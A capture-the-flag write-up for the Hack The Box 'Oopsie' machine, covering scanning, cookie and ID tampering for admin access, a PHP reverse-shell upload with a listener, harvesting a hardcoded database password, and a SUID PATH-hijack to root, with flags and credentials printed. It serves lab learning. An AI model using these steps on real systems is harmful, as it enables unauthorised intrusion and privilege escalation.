# Oopsie

|     Local    |     Remote    |
| :----------: | :-----------: |
| 10.10.15.104 | 10.129.199.96 |
|              | 10.129.185.6  |
|              | 10.129.95.191 |

## Nmap
```
nmap 10.129.199.96
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 17:00 EDT
Nmap scan report for 10.129.199.96
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```

```
nmap -Pn -sS -sV -sC -O -p 22,80 10.129.199.96
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 17:01 EDT
Nmap scan report for 10.129.199.96
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
```

```
nmap -Pn -sSVC -O -p 22,80 10.129.185.6
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 18:14 EDT
Nmap scan report for 10.129.185.6
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
```

---

## Login Page

Ran `dirbuster` and found several subdirs and pages, among which was...
- `http://10.129.185.6:80/cdn-cgi/login/index.php`
- Answer to Question: cdn-cgi/login

## Cookies

Check to see if cookies and sessions can be manipulated. 
> Cookies are text files with small pieces of data created by the web server, stored by the browser into the computer file system and being used to identify a user while is browsing a website.

You can view and change cookies in Mozilla Firefox through the usage of Developer Tools.
> Developer tools is a set of web developer tools built into Firefox. You can use them to examine, edit, and debug HTML, CSS, and JavaScript
- Just right click on the page and select "Inspect Element"
- Navigate to the "Storage" tab and select "Cookies" from the menu on the left
  - We logged in as guest (role:"guest") and our UserID is 2233 (user:"2233")
  - We want the "super admin" role and that role's userID so we can upload crap.
 
NOTE: The URL has an ID number in it (e.g., `id=2`).
```
http://10.129.185.6/cdn-cgi/login/admin.php?content=accounts&id=2
```
- Try changing that to `1` and see what happens.

![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/cb0c58fb-a058-4e9c-adf9-aa92f65f3cce)

Change the `role` value from `guest` to `admin` by double-clicking on it and typing in `admin`

Do the same for the `user` value: change it from the guest's `2233` to the admin's `34322`

# Navigate to the Upload Page

With the change in role and user ID, we now have access to the upload page. 

## Upload a Payload

Upload `/usr/share/webshells/php/php-reverse-shell.php` after modifying it to include your local IP, etc.
- Set up a listener on the local machine
- Run the .php payload by hitting this URL: `http://10.129.95.191/uploads/php-reverse-shell.php`
- Do a `bash -i` to get an interactive Bash prompt.

**Question:** What is the file that contains the password that is shared with the robert user?
- Use `grep` to find it: `grep -Rnw '/var/www/html/' -e 'robert'`
- `r` or `-R` is recursive ; use `-R` to search entirely: Recursive
- `n`: line number 
- `w`: match the whole word
- `e`: the pattern used during the search
- Result:
```
/var/www/html/cdn-cgi/login/db.php:2:$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

**WALK-THROUGH:** Used `cat` piped to `grep` to look for passwords... (but you have to be in the right subdir; mine was a broader approach and therefore better)
```
cd /var/www/html/cdn-cgi/login
ls
 # admin.php
 # db.php
 # index.php
 # script.js
cat * | grep -i passw*
```
Results: 
```
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```
**NOTE:** robert's password is NOT `MEGACORP_4dm1n!!` but rather `M3g4C0rpUs3r!`

## Flag: user 
- `cd` over to robert's home dir and cat the `user.txt` file:
```
robert@oopsie:~$ cat user.txt
cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

## PrivEsc 

We have user access but not root. 

`sudo -l` to list (`-l`) out the sudo commands our user can run: 
```
robert@oopsie:~$ sudo -l
[sudo] password for robert: M3g4C0rpUs3r!
Sorry, user robert may not run sudo on oopsie.
```

`id`: The `id` command in Linux is used to find out user and group names and numeric ID’s (UID or group ID) of the current user or any other user in the server. 
- Basic Syntax: `id [OPTION]… [USER]`
```
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
- Results: robert is part of the bugtracker group
- Let's find some files in the bugtracker group:
```
find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
```
- Check out that file: It's owned by root... and it has the **SUID** bit set...
```
ls -la /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 bugtracker

file /usr/bin/bugtracker
bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/9f54c0ae-7e9d-4d98-abbb-2ffa96c4f3db)

> Commonly noted as SUID (Set owner User ID), the special permission for the user access level has a single function: A file with SUID always executes as the user who owns the file, regardless of the user passing the command. If the file owner doesn't have execute permissions, then use an uppercase S here. In our case, the binary 'bugtracker' is owned by root & we can execute it as root since it has SUID set.

If you run that file (`./bugtracker`), it asks for input. Enter whatever and you get some feedback (it runs `cat` on your input as if it were a file name in `/root/reports/`): 
```
./bugtracker
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 12
12
---------------
cat: /root/reports/12: No such file or directory
```

**Vulnerability:** It only uses `cat` (without the full path to the executable). 
- Navigate to the `/tmp` directory and create a file named `cat` with the following content: `/bin/sh`
- Make sure to `chmod` that file so it's executable.

**Exploit:** Add the /tmp directory to the PATH environmental variable.
- Command: `export PATH=/tmp:$PATH`
- Check: `echo $PATH`
- Result: `\tmp` is first so it will be searched first for commands w/o a path provided.
```
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```
- Run the bugtracker, input whatever you want, and it should execute our `/tmp/cat` and give us a root shell.
```
robert@oopsie:/usr/bin$ ./bugtracker
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: x
x
---------------
# whoami
root
```

## Root Flag
```
# cd /root
# ls
reports  root.txt
# cat root.txt      # PROBLEM: It gave me a root shell... need full path to cat...
# /bin/cat root.txt
af13b0bee69f8a877c3faf667f7beacf
```

![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/b43b938f-b0f5-4261-ac56-ffcc308d7328)

[link to pwn cert](https://www.hackthebox.com/achievement/machine/172151/288)



